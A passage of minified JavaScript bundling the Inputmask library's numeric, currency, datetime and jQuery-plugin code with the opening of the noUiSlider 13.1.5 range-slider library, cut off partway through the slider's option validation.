(t.push(n.radixPoint), i = t.length - 1); for (var o = 1; o <= e; o++)t[i + o] = t[i + o] || "0" } return t }(t.toString().split(""), r, e).join("") }, onKeyDown: function (t, e, n, i) { var o = B(this); if (t.ctrlKey) switch (t.keyCode) { case b.keyCode.UP: o.val(parseFloat(this.inputmask.unmaskedvalue()) + parseInt(i.step)), o.trigger("setvalue"); break; case b.keyCode.DOWN: o.val(parseFloat(this.inputmask.unmaskedvalue()) - parseInt(i.step)), o.trigger("setvalue") } } }, currency: { prefix: "$ ", groupSeparator: ",", alias: "numeric", placeholder: "0", autoGroup: !0, digits: 2, digitsOptional: !1, clearMaskOnLostFocus: !1 }, decimal: { alias: "numeric" }, integer: { alias: "numeric", digits: 0, radixPoint: "" }, percentage: { alias: "numeric", digits: 2, digitsOptional: !0, radixPoint: ".", placeholder: "0", autoGroup: !1, min: 0, max: 100, suffix: " %", allowMinus: !1 } }), b }) ? i.apply(e, o) : i) || (t.exports = a) }, function (t, e, n) { "use strict"; var i, o, a, s = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) { return typeof t } : function (t) { return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t }; o = [n(4), n(2)], void 0 === (a = "function" == typeof (i = function (o, a) { if (o.fn.inputmask === undefined) { o.fn.inputmask = function (t, e) { var n, i = this[0]; if (e === undefined) e = {}; if (typeof t === "string") { switch (t) { case "unmaskedvalue": return i && i.inputmask ? i.inputmask.unmaskedvalue() : o(i).val(); case "remove": return this.each(function () { if (this.inputmask) this.inputmask.remove() }); case "getemptymask": return i && i.inputmask ? i.inputmask.getemptymask() : ""; case "hasMaskedValue": return i && i.inputmask ? i.inputmask.hasMaskedValue() : false; case "isComplete": return i && i.inputmask ? i.inputmask.isComplete() : true; case "getmetadata": return i && i.inputmask ? i.inputmask.getmetadata() : undefined; case "setvalue": a.setValue(i, e); break; case "option": if (typeof e === "string") { if (i && i.inputmask !== undefined) { return i.inputmask.option(e) } } else { return this.each(function () { if (this.inputmask !== undefined) { return this.inputmask.option(e) } }) } break; default: e.alias = t; n = new a(e); return this.each(function () { n.mask(this) }) } } else if (Array.isArray(t)) { e.alias = t; n = new a(e); return this.each(function () { n.mask(this) }) } else if ((typeof t === "undefined" ? "undefined" : s(t)) == "object") { n = new a(t); if (t.mask === undefined && t.alias === undefined) { return this.each(function () { if (this.inputmask !== undefined) { return this.inputmask.option(t) } else n.mask(this) }) } else { return this.each(function () { n.mask(this) }) } } else if (t === undefined) { return this.each(function () { n = new a(e); n.mask(this) }) } } } return o.fn.inputmask }) ? i.apply(e, o) : i) || (t.exports = a) }]), function (t) { "function" == typeof define && define.amd ? define(["./inputmask"], t) : "object" == typeof exports ? module.exports = t(require("./inputmask")) : t(window.Inputmask) }(function (r) { var g = r.dependencyLib, c = { d: ["[1-9]|[12][0-9]|3[01]", Date.prototype.setDate, "day", Date.prototype.getDate], dd: ["0[1-9]|[12][0-9]|3[01]", Date.prototype.setDate, "day", function () { return l(Date.prototype.getDate.call(this), 2) }], ddd: [""], dddd: [""], m: ["[1-9]|1[012]", Date.prototype.setMonth, "month", function () { return Date.prototype.getMonth.call(this) + 1 }], mm: ["0[1-9]|1[012]", Date.prototype.setMonth, "month", function () { return l(Date.prototype.getMonth.call(this) + 1, 2) }], mmm: [""], mmmm: [""], yy: ["[0-9]{2}", Date.prototype.setFullYear, "year", function () { return l(Date.prototype.getFullYear.call(this), 2) }], yyyy: ["[0-9]{4}", Date.prototype.setFullYear, "year", function () { return l(Date.prototype.getFullYear.call(this), 4) }], h: ["[1-9]|1[0-2]", Date.prototype.setHours, "hours", Date.prototype.getHours], hh: ["0[1-9]|1[0-2]", Date.prototype.setHours, "hours", function () { return l(Date.prototype.getHours.call(this), 2) }], hhh: ["[0-9]+", Date.prototype.setHours, "hours", Date.prototype.getHours], H: ["1?[0-9]|2[0-3]", Date.prototype.setHours, "hours", Date.prototype.getHours], HH: ["0[0-9]|1[0-9]|2[0-3]", Date.prototype.setHours, "hours", function () { return l(Date.prototype.getHours.call(this), 2) }], HHH: ["[0-9]+", Date.prototype.setHours, "hours", Date.prototype.getHours], M: ["[1-5]?[0-9]", Date.prototype.setMinutes, "minutes", Date.prototype.getMinutes], MM: ["0[0-9]|1[0-9]|2[0-9]|3[0-9]|4[0-9]|5[0-9]", Date.prototype.setMinutes, "minutes", function () { return l(Date.prototype.getMinutes.call(this), 2) }], ss: ["[0-5][0-9]", Date.prototype.setSeconds, "seconds", function () { return l(Date.prototype.getSeconds.call(this), 2) }], l: ["[0-9]{3}", Date.prototype.setMilliseconds, "milliseconds", function () { return l(Date.prototype.getMilliseconds.call(this), 3) }], L: ["[0-9]{2}", Date.prototype.setMilliseconds, "milliseconds", function () { return l(Date.prototype.getMilliseconds.call(this), 2) }], t: ["[ap]"], tt: ["[ap]m"], T: ["[AP]"], TT: ["[AP]M"], Z: [""], o: [""], S: [""] }, e = { isoDate: "yyyy-mm-dd", isoTime: "HH:MM:ss", isoDateTime: "yyyy-mm-dd'T'HH:MM:ss", isoUtcDateTime: "UTC:yyyy-mm-dd'T'HH:MM:ss'Z'" }; function I(t) { if (!t.tokenizer) { var e = []; for (var n in c) -1 === e.indexOf(n[0]) && e.push(n[0]); t.tokenizer = "(" + e.join("+|") + ")+?|.", t.tokenizer = new RegExp(t.tokenizer, "g") } return t.tokenizer } function u(t, e, n, i) { for (var o, a = ""; o = I(n).exec(t);) { if (void 0 === e) if (c[o[0]]) a += "(" + c[o[0]][0] + ")"; else switch (o[0]) { case "[": a += "("; break; case "]": a += ")?"; break; default: a += r.escapeRegex(o[0]) } else c[o[0]] ? !0 !== i && c[o[0]][3] ? a += c[o[0]][3].call(e.date) : c[o[0]][2] ? a += e["raw" + c[o[0]][2]] : a += o[0] : a += o[0] } return a } function l(t, e) { for (t = String(t), e = e || 2; t.length < e;)t = "0" + t; return t } function h(t, e, r) { var g, n, l, i = { date: new Date(1, 0, 1) }, o = t; function a(t, e) { var n, i, o, a, s; t[g] = ((s = (n = e).replace(/[^0-9]/g, "0")) != n && (i = n.replace(/[^0-9]/g, ""), o = (r.min && r.min[g] || n).toString(), a = (r.max && r.max[g] || n).toString(), s = i + (i < o.slice(0, i.length) ? o.slice(i.length) : i > a.slice(0, i.length) ? a.slice(i.length) : s.toString().slice(i.length))), s), t["raw" + g] = e, void 0 !== l && l.call(t.date, "month" == g ? parseInt(t[g]) - 1 : t[g]) } if ("string" == typeof o) { for (; n = I(r).exec(e);) { var s = o.slice(0, n[0].length); c.hasOwnProperty(n[0]) && (c[n[0]][0], g = c[n[0]][2], l = c[n[0]][1], a(i, s)), o = o.slice(s.length) } return i } if (o && "object" == typeof o && o.hasOwnProperty("date")) return o } return r.extendAliases({ datetime: { mask: function (t) { return c.S = t.i18n.ordinalSuffix.join("|"), t.inputFormat = e[t.inputFormat] || t.inputFormat, t.displayFormat = e[t.displayFormat] || t.displayFormat || t.inputFormat, t.outputFormat = e[t.outputFormat] || t.outputFormat || t.inputFormat, t.placeholder = "" !== t.placeholder ? t.placeholder : t.inputFormat.replace(/[\[\]]/, ""), t.regex = u(t.inputFormat, void 0, t), null }, placeholder: "", inputFormat: "isoDateTime", displayFormat: void 0, outputFormat: void 0, min: null, max: null, i18n: { dayNames: ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"], monthNames: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec", "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"], ordinalSuffix: ["st", "nd", "rd", "th"] }, postValidation: function (t, e, n, i) { i.min = h(i.min, i.inputFormat, i), i.max = h(i.max, i.inputFormat, i); var o, a, s, r, g, l, c = n, I = h(t.join(""), i.inputFormat, i); return c && I.date.getTime() === I.date.getTime() && (g = I, l = c, c = (c = (!isFinite(g.rawday) || "29" == g.day && !isFinite(g.rawyear) || new Date(g.date.getFullYear(), isFinite(g.rawmonth) ? g.month : g.date.getMonth() + 1, 0).getDate() >= g.day) && l) && (o = I, r = !0, (a = i).min && (o.rawyear && (s = o.rawyear.replace(/[^0-9]/g, ""), r = a.min.year.substr(0, s.length) <= s), o.year === o.rawyear && a.min.date.getTime() === a.min.date.getTime() && (r = a.min.date.getTime() <= o.date.getTime())), r && a.max && a.max.date.getTime() === a.max.date.getTime() && (r = a.max.date.getTime() >= o.date.getTime()), r)), e && c && n.pos !== e ? { buffer: u(i.inputFormat, I, i), refreshFromBuffer: { start: e, end: n.pos } } : c }, onKeyDown: function (t, e, n, i) { if (t.ctrlKey && t.keyCode === r.keyCode.RIGHT) { for (var o, a = new Date, s = ""; o = I(i).exec(i.inputFormat);)"d" === o[0].charAt(0) ? s += l(a.getDate(), o[0].length) : "m" === o[0].charAt(0) ? s += l(a.getMonth() + 1, o[0].length) : "yyyy" === o[0] ? s += a.getFullYear().toString() : "y" === o[0].charAt(0) && (s += l(a.getYear(), o[0].length)); this.inputmask._valueSet(s), g(this).trigger("setvalue") } }, onUnMask: function (t, e, n) { return u(n.outputFormat, h(t, n.inputFormat, n), n, !0) }, casing: function (t, e, n, i) { return 0 == e.nativeDef.indexOf("[ap]") ? t.toLowerCase() : 0 == e.nativeDef.indexOf("[AP]") ? t.toUpperCase() : t }, insertMode: !1, shiftPositions: !1 } }), r }), function (t) { "function" == typeof define && define.amd ? define(["./inputmask"], t) : "object" == typeof exports ? module.exports = t(require("./inputmask")) : t(window.Inputmask) }(function (b) { var B = b.dependencyLib; function s(t, e) { for (var n = "", i = 0; i < t.length; i++)b.prototype.definitions[t.charAt(i)] || e.definitions[t.charAt(i)] || e.optionalmarker.start === t.charAt(i) || e.optionalmarker.end === t.charAt(i) || e.quantifiermarker.start === t.charAt(i) || e.quantifiermarker.end === t.charAt(i) || e.groupmarker.start === t.charAt(i) || e.groupmarker.end === t.charAt(i) || e.alternatormarker === t.charAt(i) ? n += "\\" + t.charAt(i) : n += t.charAt(i); return n } return b.extendAliases({ numeric: { mask: function (t) { var e, n; 0 !== t.repeat && isNaN(t.integerDigits) && (t.integerDigits = t.repeat), t.repeat = 0, t.groupSeparator === t.radixPoint && t.digits && "0" !== t.digits && ("." === t.radixPoint ? t.groupSeparator = "," : "," === t.radixPoint ? t.groupSeparator = "." : t.groupSeparator = ""), " " === t.groupSeparator && (t.skipOptionalPartCharacter = void 0), t.autoGroup = t.autoGroup && "" !== t.groupSeparator, t.autoGroup && ("string" == typeof t.groupSize && isFinite(t.groupSize) && (t.groupSize = parseInt(t.groupSize)), isFinite(t.integerDigits) && (e = Math.floor(t.integerDigits / t.groupSize), n = t.integerDigits % t.groupSize, t.integerDigits = parseInt(t.integerDigits) + (0 == n ? e - 1 : e), t.integerDigits < 1 && (t.integerDigits = "*"))), 1 < t.placeholder.length && (t.placeholder = t.placeholder.charAt(0)), "radixFocus" === t.positionCaretOnClick && "" === t.placeholder && !1 === t.integerOptional && (t.positionCaretOnClick = "lvp"), t.definitions[";"] = t.definitions["~"], t.definitions[";"].definitionSymbol = "~", !0 === t.numericInput && (t.positionCaretOnClick = "radixFocus" === t.positionCaretOnClick ? "lvp" : t.positionCaretOnClick, t.digitsOptional = !1, isNaN(t.digits) && (t.digits = 2), t.decimalProtect = !1); var i, o, a = "[+]"; return a += s(t.prefix, t), !0 === t.integerOptional ? a += "~{1," + t.integerDigits + "}" : a += "~{" + t.integerDigits + "}", void 0 !== t.digits && (i = t.decimalProtect ? ":" : t.radixPoint, o = t.digits.toString().split(","), isFinite(o[0]) && o[1] && isFinite(o[1]) ? a += i + ";{" + t.digits + "}" : (isNaN(t.digits) || 0 < parseInt(t.digits)) && (t.digitsOptional ? a += "[" + i + ";{1," + t.digits + "}]" : a += i + ";{" + t.digits + "}")), a += s(t.suffix, t), a += "[-]", t.greedy = !1, a }, placeholder: "", greedy: !1, digits: "*", digitsOptional: !0, enforceDigitsOnBlur: !1, radixPoint: ".", positionCaretOnClick: "radixFocus", groupSize: 3, groupSeparator: "", autoGroup: !1, allowMinus: !0, negationSymbol: { front: "-", back: "" }, integerDigits: "+", integerOptional: !0, prefix: "", suffix: "", rightAlign: !0, decimalProtect: !0, min: null, max: null, step: 1, insertMode: !0, autoUnmask: !1, unmaskAsNumber: !1, inputType: "text", inputmode: "numeric", preValidation: function (t, e, n, i, o, a) { if ("-" === n || n === o.negationSymbol.front) return !0 === o.allowMinus && (o.isNegative = void 0 === o.isNegative || !o.isNegative, "" === t.join("") || { caret: a.validPositions[e] ? e : void 0, dopost: !0 }); if (!1 === i && n === o.radixPoint && void 0 !== o.digits && (isNaN(o.digits) || 0 < parseInt(o.digits))) { var s = B.inArray(o.radixPoint, t); if (-1 !== s && void 0 !== a.validPositions[s]) return !0 === o.numericInput ? e === s : { caret: s + 1 } } return !0 }, postValidation: function (t, e, n, i) { var o = i.suffix.split(""), a = i.prefix.split(""); if (void 0 === n.pos && void 0 !== n.caret && !0 !== n.dopost) return n; var s = void 0 !== n.caret ? n.caret : n.pos, r = t.slice(); i.numericInput && (s = r.length - s - 1, r = r.reverse()); var g = r[s]; if (g === i.groupSeparator && (g = r[s += 1]), s === r.length - i.suffix.length - 1 && g === i.radixPoint) return n; void 0 !== g && g !== i.radixPoint && g !== i.negationSymbol.front && g !== i.negationSymbol.back && (r[s] = "?", 0 < i.prefix.length && s >= (!1 === i.isNegative ? 1 : 0) && s < i.prefix.length - 1 + (!1 === i.isNegative ? 1 : 0) ? a[s - (!1 === i.isNegative ? 1 : 0)] = "?" : 0 < i.suffix.length && s >= r.length - i.suffix.length - (!1 === i.isNegative ? 1 : 0) && (o[s - (r.length - i.suffix.length - (!1 === i.isNegative ? 1 : 0))] = "?")), a = a.join(""), o = o.join(""); var l, c, I, u, h, d, C = r.join("").replace(a, ""); if (C = (C = (C = (C = C.replace(o, "")).replace(new RegExp(b.escapeRegex(i.groupSeparator), "g"), "")).replace(new RegExp("[-" + b.escapeRegex(i.negationSymbol.front) + "]", "g"), "")).replace(new RegExp(b.escapeRegex(i.negationSymbol.back) + "$"), ""), isNaN(i.placeholder) && (C = C.replace(new RegExp(b.escapeRegex(i.placeholder), "g"), "")), 1 < C.length && 1 !== C.indexOf(i.radixPoint) && ("0" === g && (C = C.replace(/^\?/g, "")), C = C.replace(/^0/g, "")), C.charAt(0) === i.radixPoint && "" !== i.radixPoint && !0 !== i.numericInput && (C = "0" + C), "" !== C) { if (C = C.split(""), (!i.digitsOptional || i.enforceDigitsOnBlur && "blur" === n.event) && isFinite(i.digits)) { var A = B.inArray(i.radixPoint, C), p = B.inArray(i.radixPoint, r); -1 === A && (C.push(i.radixPoint), A = C.length - 1); for (var m = 1; m <= i.digits; m++)i.digitsOptional && (!i.enforceDigitsOnBlur || "blur" !== n.event) || void 0 !== C[A + m] && C[A + m] !== i.placeholder.charAt(0) ? -1 !== p && void 0 !== r[p + m] && (C[A + m] = C[A + m] || r[p + m]) : C[A + m] = n.placeholder || i.placeholder.charAt(0) } !0 !== i.autoGroup || "" === i.groupSeparator || g === i.radixPoint && void 0 === n.pos && !n.dopost ? C = C.join("") : (l = C[C.length - 1] === i.radixPoint && n.c === i.radixPoint, C = b((c = C, h = "", h += "(" + (I = i).groupSeparator + "*{" + I.groupSize + "}){*}", "" === I.radixPoint || (u = c.join("").split(I.radixPoint))[1] && (h += I.radixPoint + "*{" + u[1].match(/^\d*\??\d*/)[0].length + "}"), h), { numericInput: !0, jitMasking: !0, definitions: { "*": { validator: "[0-9?]", cardinality: 1 } } }).format(C.join("")), l && (C += i.radixPoint), C.charAt(0) === i.groupSeparator && C.substr(1)) } i.isNegative && "blur" === n.event && (i.isNegative = "0" !== C), C = a + C, C += o, i.isNegative && (C = i.negationSymbol.front + C, C += i.negationSymbol.back), C = C.split(""), void 0 !== g && (g !== i.radixPoint && g !== i.negationSymbol.front && g !== i.negationSymbol.back ? -1 < (s = B.inArray("?", C)) ? C[s] = g : s = n.caret || 0 : g !== i.radixPoint && g !== i.negationSymbol.front && g !== i.negationSymbol.back || -1 !== (d = B.inArray(g, C)) && (s = d)), i.numericInput && (s = C.length - s - 1, C = C.reverse()); var f = { caret: void 0 !== g && void 0 === n.pos || void 0 === s ? s : s + (i.numericInput ? -1 : 1), buffer: C, refreshFromBuffer: n.dopost || t.join("") !== C.join("") }; return f.refreshFromBuffer ? f : n }, onBeforeWrite: function (t, e, n, i) { if (t) switch (t.type) { case "keydown": return i.postValidation(e, n, { caret: n, dopost: !0 }, i); case "blur": case "checkval": var o; if (void 0 === (a = i).parseMinMaxOptions && (null !== a.min && (a.min = a.min.toString().replace(new RegExp(b.escapeRegex(a.groupSeparator), "g"), ""), "," === a.radixPoint && (a.min = a.min.replace(a.radixPoint, ".")), a.min = isFinite(a.min) ? parseFloat(a.min) : NaN, isNaN(a.min) && (a.min = Number.MIN_VALUE)), null !== a.max && (a.max = a.max.toString().replace(new RegExp(b.escapeRegex(a.groupSeparator), "g"), ""), "," === a.radixPoint && (a.max = a.max.replace(a.radixPoint, ".")), a.max = isFinite(a.max) ? parseFloat(a.max) : NaN, isNaN(a.max) && (a.max = Number.MAX_VALUE)), a.parseMinMaxOptions = "done"), null !== i.min || null !== i.max) { if (o = i.onUnMask(e.join(""), void 0, B.extend({}, i, { unmaskAsNumber: !0 })), null !== i.min && o < i.min) return i.isNegative = i.min < 0, i.postValidation(i.min.toString().replace(".", i.radixPoint).split(""), n, { caret: n, dopost: !0, placeholder: "0" }, i); if (null !== i.max && o > i.max) return i.isNegative = i.max < 0, i.postValidation(i.max.toString().replace(".", i.radixPoint).split(""), n, { caret: n, dopost: !0, placeholder: "0" }, i) } return i.postValidation(e, n, { caret: n, placeholder: "0", event: "blur" }, i); case "_checkval": return { caret: n } }var a }, regex: { integerPart: function (t, e) { return e ? new RegExp("[" + b.escapeRegex(t.negationSymbol.front) + "+]?") : new RegExp("[" + b.escapeRegex(t.negationSymbol.front) + "+]?\\d+") }, integerNPart: function (t) { return new RegExp("[\\d" + b.escapeRegex(t.groupSeparator) + b.escapeRegex(t.placeholder.charAt(0)) + "]+") } }, definitions: { "~": { validator: function (t, e, n, i, o, a) { var s; if ("k" === t || "m" === t) { s = { insert: [], c: 0 }; for (var r = 0, g = "k" === t ? 2 : 5; r < g; r++)s.insert.push({ pos: n + r, c: 0 }); return s.pos = n + g, s } if (!0 === (s = i ? new RegExp("[0-9" + b.escapeRegex(o.groupSeparator) + "]").test(t) : new RegExp("[0-9]").test(t))) { if (!0 !== o.numericInput && void 0 !== e.validPositions[n] && "~" === e.validPositions[n].match.def && !a) { var l = e.buffer.join(""), c = (l = (l = l.replace(new RegExp("[-" + b.escapeRegex(o.negationSymbol.front) + "]", "g"), "")).replace(new RegExp(b.escapeRegex(o.negationSymbol.back) + "$"), "")).split(o.radixPoint); 1 < c.length && (c[1] = c[1].replace(/0/g, o.placeholder.charAt(0))), "0" === c[0] && (c[0] = c[0].replace(/0/g, o.placeholder.charAt(0))), l = c[0] + o.radixPoint + c[1] || ""; var I = e._buffer.join(""); for (l === o.radixPoint && (l = I); null === l.match(b.escapeRegex(I) + "$");)I = I.slice(1); s = void 0 === (l = (l = l.replace(I, "")).split(""))[n] ? { pos: n, remove: n } : { pos: n } } } else i || t !== o.radixPoint || void 0 !== e.validPositions[n - 1] || (s = { insert: { pos: n, c: 0 }, pos: n + 1 }); return s }, cardinality: 1 }, "+": { validator: function (t, e, n, i, o) { return o.allowMinus && ("-" === t || t === o.negationSymbol.front) }, cardinality: 1, placeholder: "" }, "-": { validator: function (t, e, n, i, o) { return o.allowMinus && t === o.negationSymbol.back }, cardinality: 1, placeholder: "" }, ":": { validator: function (t, e, n, i, o) { var a = "[" + b.escapeRegex(o.radixPoint) + "]", s = new RegExp(a).test(t); return s && e.validPositions[n] && e.validPositions[n].match.placeholder === o.radixPoint && (s = { caret: n + 1 }), s }, cardinality: 1, placeholder: function (t) { return t.radixPoint } } }, onUnMask: function (t, e, n) { if ("" === e && !0 === n.nullable) return e; var i = t.replace(n.prefix, ""); return i = (i = i.replace(n.suffix, "")).replace(new RegExp(b.escapeRegex(n.groupSeparator), "g"), ""), "" !== n.placeholder.charAt(0) && (i = i.replace(new RegExp(n.placeholder.charAt(0), "g"), "0")), n.unmaskAsNumber ? ("" !== n.radixPoint && -1 !== i.indexOf(n.radixPoint) && (i = i.replace(b.escapeRegex.call(this, n.radixPoint), ".")), i = (i = i.replace(new RegExp("^" + b.escapeRegex(n.negationSymbol.front)), "-")).replace(new RegExp(b.escapeRegex(n.negationSymbol.back) + "$"), ""), Number(i)) : i }, isComplete: function (t, e) { var n = (e.numericInput ? t.slice().reverse() : t).join(""); return n = (n = (n = (n = (n = n.replace(new RegExp("^" + b.escapeRegex(e.negationSymbol.front)), "-")).replace(new RegExp(b.escapeRegex(e.negationSymbol.back) + "$"), "")).replace(e.prefix, "")).replace(e.suffix, "")).replace(new RegExp(b.escapeRegex(e.groupSeparator) + "([0-9]{3})", "g"), "$1"), "," === e.radixPoint && (n = n.replace(b.escapeRegex(e.radixPoint), ".")), isFinite(n) }, onBeforeMask: function (t, e) { e.isNegative = void 0; var n = e.radixPoint || ","; "number" != typeof t && "number" !== e.inputType || "" === n || (t = t.toString().replace(".", n)); var i = t.split(n), o = i[0].replace(/[^\-0-9]/g, ""), a = 1 < i.length ? i[1].replace(/[^0-9]/g, "") : ""; t = o + ("" !== a ? n + a : a); var s, r = 0; return "" !== n && (r = a.length, "" !== a && (s = Math.pow(10, r || 1), isFinite(e.digits) && (r = parseInt(e.digits), s = Math.pow(10, r)), t = t.replace(b.escapeRegex(n), "."), isFinite(t) && (t = Math.round(parseFloat(t) * s) / s), t = t.toString().replace(".", n))), 0 === e.digits && -1 !== t.indexOf(b.escapeRegex(n)) && (t = t.substring(0, t.indexOf(b.escapeRegex(n)))), function (t, e, n) { if (0 < e) { var i = B.inArray(n.radixPoint, t); -1 === i && (t.push(n.radixPoint), i = t.length - 1); for (var o = 1; o <= e; o++)t[i + o] = t[i + o] || "0" } return t }(t.toString().split(""), r, e).join("") }, onKeyDown: function (t, e, n, i) { var o = B(this); if (t.ctrlKey) switch (t.keyCode) { case b.keyCode.UP: o.val(parseFloat(this.inputmask.unmaskedvalue()) + parseInt(i.step)), o.trigger("setvalue"); break; case b.keyCode.DOWN: o.val(parseFloat(this.inputmask.unmaskedvalue()) - parseInt(i.step)), o.trigger("setvalue") } } }, currency: { prefix: "$ ", groupSeparator: ",", alias: "numeric", placeholder: "0", autoGroup: !0, digits: 2, digitsOptional: !1, clearMaskOnLostFocus: !1 }, decimal: { alias: "numeric" }, integer: { alias: "numeric", digits: 0, radixPoint: "" }, percentage: { alias: "numeric", digits: 2, digitsOptional: !0, radixPoint: ".", placeholder: "0", autoGroup: !1, min: 0, max: 100, suffix: " %", allowMinus: !1 } }), b }), function (t) { "function" == typeof define && define.amd ? define([], t) : "object" == typeof exports ? module.exports = t() : window.noUiSlider = t() }(function () { "use strict"; var ct = "13.1.5"; function It(t) { t.parentElement.removeChild(t) } function r(t) { return null != t } function ut(t) { t.preventDefault() } function I(t) { return "number" == typeof t && !isNaN(t) && isFinite(t) } function ht(t, e, n) { 0 < n && (At(t, e), setTimeout(function () { pt(t, e) }, n)) } function dt(t) { return Math.max(Math.min(t, 100), 0) } function Ct(t) { return Array.isArray(t) ? t : [t] } function e(t) { var e = (t = String(t)).split("."); return 1 < e.length ? e[1].length : 0 } function At(t, e) { t.classList ? t.classList.add(e) : t.className += " " + e } function pt(t, e) { t.classList ? t.classList.remove(e) : t.className = t.className.replace(new RegExp("(^|\\b)" + e.split(" ").join("|") + "(\\b|$)", "gi"), " ") } function mt(t) { var e = void 0 !== window.pageXOffset, n = "CSS1Compat" === (t.compatMode || ""); return { x: e ? window.pageXOffset : n ? t.documentElement.scrollLeft : t.body.scrollLeft, y: e ? window.pageYOffset : n ? t.documentElement.scrollTop : t.body.scrollTop } } function u(t, e) { return 100 / (e - t) } function h(t, e) { return 100 * e / (t[1] - t[0]) } function c(t, e) { for (var n = 1; t >= e[n];)n += 1; return n } function n(t, e, n) { if (n >= t.slice(-1)[0]) return 100; var i, o, a = c(n, t), s = t[a - 1], r = t[a], g = e[a - 1], l = e[a]; return g + (o = n, h(i = [s, r], i[0] < 0 ? o + Math.abs(i[0]) : o - i[0]) / u(g, l)) } function i(t, e, n, i) { if (100 === i) return i; var o, a, s = c(i, t), r = t[s - 1], g = t[s]; return n ? (g - r) / 2 < i - r ? g : r : e[s - 1] ? t[s - 1] + (o = i - t[s - 1], a = e[s - 1], Math.round(o / a) * a) : i } function o(t, e, n) { var i; this.xPct = [], this.xVal = [], this.xSteps = [n || !1], this.xNumSteps = [!1], this.xHighestCompleteStep = [], this.snap = e; var o, a, s, r, g, l, c = []; for (i in t) t.hasOwnProperty(i) && c.push([t[i], i]); for (c.length && "object" == typeof c[0][0] ? c.sort(function (t, e) { return t[0][0] - e[0][0] }) : c.sort(function (t, e) { return t[0] - e[0] }), i = 0; i < c.length; i++)!function (t, e, n) { var i; if ("number" == typeof e && (e = [e]), !Array.isArray(e)) throw new Error("noUiSlider (" + ct + "): 'range' contains invalid value."); if (!I(i = "min" === t ? 0 : "max" === t ? 100 : parseFloat(t)) || !I(e[0])) throw new Error("noUiSlider (" + ct + "): 'range' value isn't numeric."); n.xPct.push(i), n.xVal.push(e[0]), i ? n.xSteps.push(!isNaN(e[1]) && e[1]) : isNaN(e[1]) || (n.xSteps[0] = e[1]), n.xHighestCompleteStep.push(0) }(c[i][1], c[i][0], this); for (this.xNumSteps = this.xSteps.slice(0), i = 0; i < this.xNumSteps.length; i++)o = i, a = this.xNumSteps[i], s = this, r = void 0, a && (s.xVal[o] !== s.xVal[o + 1] ? (s.xSteps[o] = h([s.xVal[o], s.xVal[o + 1]], a) / u(s.xPct[o], s.xPct[o + 1]), r = (s.xVal[o + 1] - s.xVal[o]) / s.xNumSteps[o], g = Math.ceil(Number(r.toFixed(3)) - 1), l = s.xVal[o] + s.xNumSteps[o] * g, s.xHighestCompleteStep[o] = l) : s.xSteps[o] = s.xHighestCompleteStep[o] = s.xVal[o]) } o.prototype.getMargin = function (t) { var e = this.xNumSteps[0]; if (e && t / e % 1 != 0) throw new Error("noUiSlider (" + ct + "): 'limit', 'margin' and 'padding' must be divisible by step."); return 2 === this.xPct.length && h(this.xVal, t) }, o.prototype.toStepping = function (t) { return t = n(this.xVal, this.xPct, t) }, o.prototype.fromStepping = function (t) { return function (t, e, n) { if (100 <= n) return t.slice(-1)[0]; var i, o = c(n, e), a = t[o - 1], s = t[o], r = e[o - 1], g = e[o]; return (n - r) * u(r, g) * ((i = [a, s])[1] - i[0]) / 100 + i[0] }(this.xVal, this.xPct, t) }, o.prototype.getStep = function (t) { return t = i(this.xPct, this.xSteps, this.snap, t) }, o.prototype.getDefaultStep = function (t, e, n) { var i = c(t, this.xPct); return (100 === t || e && t === this.xPct[i - 1]) && (i = Math.max(i - 1, 1)), (this.xVal[i] - this.xVal[i - 1]) / n }, o.prototype.getNearbySteps = function (t) { var e = c(t, this.xPct); return { stepBefore: { startValue: this.xVal[e - 2], step: this.xNumSteps[e - 2], highestStep: this.xHighestCompleteStep[e - 2] }, thisStep: { startValue: this.xVal[e - 1], step: this.xNumSteps[e - 1], highestStep: this.xHighestCompleteStep[e - 1] }, stepAfter: { startValue: this.xVal[e], step: this.xNumSteps[e], highestStep: this.xHighestCompleteStep[e] } } }, o.prototype.countStepDecimals = function () { var t = this.xNumSteps.map(e); return Math.max.apply(null, t) }, o.prototype.convert = function (t) { return this.getStep(this.toStepping(t)) }; var g = { to: function (t) { return void 0 !== t && t.toFixed(2) }, from: Number }; function a(t) { if ("object" == typeof (e = t) && "function" == typeof e.to && "function" == typeof e.from) return 1; var e; throw new Error("noUiSlider (" + ct + "): 'format' requires 'to' and 'from' methods.") } function l(t, e) { if (!I(e)) throw new Error("noUiSlider (" + ct + "): 'step' is not numeric."); t.singleStep = e } function d(t, e) { if ("object" != typeof e || Array.isArray(e)) throw new Error("noUiSlider (" + ct + "): 'range' is not an object."); if (void 0 === e.min || void 0 === e.max) throw new Error("noUiSlider (" + ct + "): Missing 'min' or 'max' in 'range'."); if (e.min === e.max) throw new Error("noUiSlider (" + ct + "): 'range' 'min' and 'max' cannot be equal."); t.spectrum = new o(e, t.snap, t.singleStep) } function C(t, e) { if (e = Ct(e), !Array.isArray(e) || !e.length) throw new Error("noUiSlider (" + ct + "): 'start' option is incorrect."); t.handles = e.length, t.start = e } function A(t, e) { if ("boolean" != typeof (t.snap = e)) throw new Error("noUiSlider (" + ct + "): 'snap' option must be a boolean.") } function p(t, e) { if ("boolean" != typeof (t.animate = e)) throw new Error("noUiSlider (" + ct + "): 'animate' option must be a boolean.") } function m(t, e) { if ("number" != typeof (t.animationDuration = e)) throw new Error("noUiSlider (" + ct + "): 'animationDuration' option must be a number.") } function f(t, e) { var n, i = [!1]; if ("lower" === e ? e = [!0, !1] : "upper" === e && (e = [!1, !0]), !0 === e || !1 === e) { for (n = 1; n < t.handles; n++)i.push(e); i.push(!1) } else { if (!Array.isArray(e) || !e.length || e.length !== t.handles + 1) throw new Error("noUiSlider (" + ct + "): 'connect' option doesn't match handle count."); i = e } t.connect = i } function b(t, e) { switch (e) { case "horizontal": t.ort = 0; break; case "vertical": t.ort = 1; break; default: throw new Error("noUiSlider (" + ct + "): 'orientation' option is invalid.") } } function B(t, e) { if (!I(e)) throw new Error("noUiSlider (" + ct + "): 'margin' option must be numeric."); if (0 !== e && (t.margin = t.spectrum.getMargin(e), !t.margin)) throw new Error("noUiSlider (" + ct + 